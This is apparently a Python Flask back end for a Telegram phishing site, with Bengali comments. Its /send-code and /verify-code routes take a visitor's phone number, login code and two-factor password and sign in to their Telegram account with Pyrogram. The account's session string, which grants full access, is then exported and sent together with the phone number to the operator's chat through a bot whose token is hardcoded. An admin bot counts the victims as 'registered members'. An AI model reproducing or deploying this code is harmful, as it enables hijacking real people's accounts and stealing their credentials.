import os
import asyncio
import threading
import traceback
import requests
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid
)

app = Flask(__name__)
CORS(app)

# --- টেলিগ্রাম এবং এপিআই কনফিগারেশন ---
API_ID = int(os.environ.get("API_ID", 33511945))
API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")

BOT_TOKEN = "8613982412:AAEzoWkhawmQuRyAHh89jj68gru2oIowL5E"
OWNER_CHAT_ID = "-1003962414788"  
ADMIN_ID = 6034439625             

active_clients = {}
total_logged_in_users = 0  
admin_states = {} 

# --- Helper Functions ---
def send_telegram_message(chat_id, text, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        pass

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    """মেসেজ এডিট করার ফাংশন (নতুন মেসেজ না পাঠিয়ে আগেরটা পরিবর্তন করবে)"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "Markdown"
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        pass

def answer_callback(callback_query_id, text, show_alert=False):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=10)
    except Exception as e:
        pass

def download_telegram_file(file_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
        res = requests.get(url).json()
        if res.get("ok"):
            file_path = res["result"]["file_path"]
            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            file_data = requests.get(download_url).content
            os.makedirs("static", exist_ok=True)
            ext = file_path.split('.')[-1]
            save_path = f"static/website_background.{ext}"
            with open(save_path, "wb") as f:
                f.write(file_data)
            return True, ext
    except Exception as e:
        pass
    return False, None

# --- UI Components ---
def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "📊 Total Registration Members", "callback_data": "total_members"}],
            [{"text": "🖼️ Website Background Manager", "callback_data": "bg_manager"}],
            [{"text": "🔐 Session String Manager", "callback_data": "session_manager"}]
        ]
    }

def get_welcome_text():
    return (
        "👋 Welcome to User Info Robot! 🌐\n\n"
        "Manage your website and monitor user activity.\n"
        "👇 Select an option below to continue."
    )

def get_back_button():
    return {
        "inline_keyboard": [
            [{"text": "🔙 Back", "callback_data": "back_to_main"}]
        ]
    }

# --- Pyrogram Background Loop ---
bg_loop = asyncio.new_event_loop()
def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()
loop_thread = threading.Thread(target=start_background_loop, args=(bg_loop,), daemon=True)
loop_thread.start()
def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
    return future.result()


# ==========================================
#          FLASK WEB ROUTES (FRONTEND & API)
# ==========================================
@app.route('/', methods=['GET'])
def home(): return send_file('index.html') if os.path.exists('index.html') else ("Not found", 404)

@app.route('/verify', methods=['GET'])
def verify_page(): return send_file('verify.html') if os.path.exists('verify.html') else ("Not found", 404)

@app.route('/dashboard.html', methods=['GET'])
def dashboard_page(): return send_file('dashboard.html') if os.path.exists('dashboard.html') else ("Not found", 404)

@app.route('/profile.html', methods=['GET'])
def profile_page(): return send_file('profile.html') if os.path.exists('profile.html') else ("Not found", 404)

@app.route('/send-code', methods=['POST'])
def send_code():
    # ... (আপনার আগের send_code এর কোড অপরিবর্তিত আছে) ...
    pass # সংক্ষেপের জন্য স্কিপ করা হলো, আপনি আগের ফুল কোডটা এখানে রাখতে পারেন, বা নিচের ফুল ব্লক ইউজ করুন
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    if not phone: return jsonify({"status": "error", "message": "Phone number is required"}), 400
    try:
        session_name = f"session_{phone.replace('+', '')}"
        async def _send():
            if phone in active_clients:
                try: await active_clients[phone]["client"].disconnect()
                except: pass
            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[phone] = {"client": client, "phone_code_hash": sent_code.phone_code_hash}
            return sent_code.phone_code_hash
        phone_code_hash = run_async(_send())
        return jsonify({"status": "success", "message": "OTP code sent!", "phone_code_hash": phone_code_hash})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-code', methods=['POST'])
def verify_code():
    global total_logged_in_users
    data = request.get_json(silent=True) or {}
    phone = str(data.get('phone', '')).strip()
    code = str(data.get('code', '')).strip()
    password = data.get('password')
    if not phone or not code: return jsonify({"status": "error", "message": "Phone and Code required"}), 400
    if phone not in active_clients: return jsonify({"status": "error", "message": "Session expired."}), 400
    client_data = active_clients[phone]
    client = client_data["client"]
    phone_code_hash = client_data["phone_code_hash"]
    try:
        async def _verify():
            try: await client.sign_in(phone, phone_code_hash, code)
            except SessionPasswordNeeded:
                if not password: return {"status": "2fa_required"}
                await client.check_password(str(password))
            session_string = await client.export_session_string()
            await client.disconnect()
            return {"status": "success", "session_string": session_string}
        res = run_async(_verify())
        if res and res.get("status") == "2fa_required": return jsonify({"status": "2fa_required", "message": "2FA required"})
        if res and res.get("status") == "success":
            total_logged_in_users += 1
            session_string = res.get("session_string")
            msg = f"🎉 *New Login!*\n📱 `{phone}`\n📊 Total: `{total_logged_in_users}`\n🔑 `{session_string}`"
            send_telegram_message(OWNER_CHAT_ID, msg)
            active_clients.pop(phone, None)
            return jsonify({"status": "success", "message": "Session generated!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify({"total_users_logged_in": total_logged_in_users})


# ==========================================
#          TELEGRAM BOT WEBHOOK ROUTE
# ==========================================
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    try:
        data = request.get_json(silent=True) or {}
        
        # --- ১. মেসেজ হ্যান্ডলার ---
        if "message" in data:
            message = data["message"]
            chat_id = message["chat"]["id"]
            user_id = message["from"]["id"]
            text = message.get("text", "").strip()

            if user_id in admin_states:
                state = admin_states[user_id]
                if state == "WAITING_FOR_BG":
                    file_id = None
                    if "photo" in message: file_id = message["photo"][-1]["file_id"]
                    elif "video" in message: file_id = message["video"]["file_id"]
                    elif "document" in message: file_id = message["document"]["file_id"]

                    if file_id:
                        send_telegram_message(chat_id, "⏳ Downloading and applying background...")
                        success, ext = download_telegram_file(file_id)
                        if success:
                            send_telegram_message(chat_id, f"✅ **Background uploaded!** saved as `website_background.{ext}`.\n\nType /start to open menu.")
                        else:
                            send_telegram_message(chat_id, "⚠️ Error downloading file.")
                    else:
                        send_telegram_message(chat_id, "⚠️ Invalid format. Send an image/video.")
                    del admin_states[user_id]
                    return "OK", 200

                elif state == "WAITING_FOR_SESSION":
                    send_telegram_message(chat_id, f"🔒 Authentication initiated for `{text}`.\nType /start to open menu.")
                    del admin_states[user_id]
                    return "OK", 200

            if text == "/start":
                # মেইন মেনু পাঠানো
                send_telegram_message(chat_id, get_welcome_text(), get_main_menu())

        # --- ২. ইনলাইন বাটন (Callback Query) হ্যান্ডলার ---
        elif "callback_query" in data:
            callback_query = data["callback_query"]
            callback_data = callback_query.get("data")
            chat_id = callback_query["message"]["chat"]["id"]
            message_id = callback_query["message"]["message_id"]
            user_id = callback_query["from"]["id"]
            callback_query_id = callback_query["id"]

            if callback_data == "total_members":
                answer_callback(callback_query_id, "Fetching data...")
                stats_text = (
                    f"📊 *Website Registration Statistics*\n\n"
                    f"👥 Total Registered Members: `{total_logged_in_users:,}`\n\n"
                    f"✅ Statistics updated from live server!"
                )
                # নতুন মেসেজের বদলে কারেন্ট মেসেজটা এডিট করবে এবং Back বাটন বসাবে
                edit_telegram_message(chat_id, message_id, stats_text, get_back_button())

            elif callback_data == "bg_manager":
                if user_id != ADMIN_ID:
                    answer_callback(callback_query_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                
                answer_callback(callback_query_id, "Background Manager")
                admin_states[user_id] = "WAITING_FOR_BG"
                bg_text = (
                    "🖼️ **Website Background Manager**\n\n"
                    "Please send the new background image or video file directly here to upload and apply it to the website."
                )
                edit_telegram_message(chat_id, message_id, bg_text, get_back_button())

            elif callback_data == "session_manager":
                if user_id != ADMIN_ID:
                    answer_callback(callback_query_id, "⛔ Unauthorized!", show_alert=True)
                    return "OK", 200
                
                answer_callback(callback_query_id, "Session Manager")
                admin_states[user_id] = "WAITING_FOR_SESSION"
                session_text = (
                    "🔐 **Session String Manager**\n\n"
                    "Please enter the authorized Phone Number (with country code) or User ID to begin secure verification:"
                )
                edit_telegram_message(chat_id, message_id, session_text, get_back_button())

            elif callback_data == "back_to_main":
                # ব্যাক বাটনে ক্লিক করলে এডমিন স্টেট ক্লিয়ার করবে এবং মেইন মেনু ফিরিয়ে আনবে
                if user_id in admin_states:
                    del admin_states[user_id]
                answer_callback(callback_query_id, "Back to Main Menu")
                edit_telegram_message(chat_id, message_id, get_welcome_text(), get_main_menu())

    except Exception as e:
        print("Webhook Error:", traceback.format_exc())
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
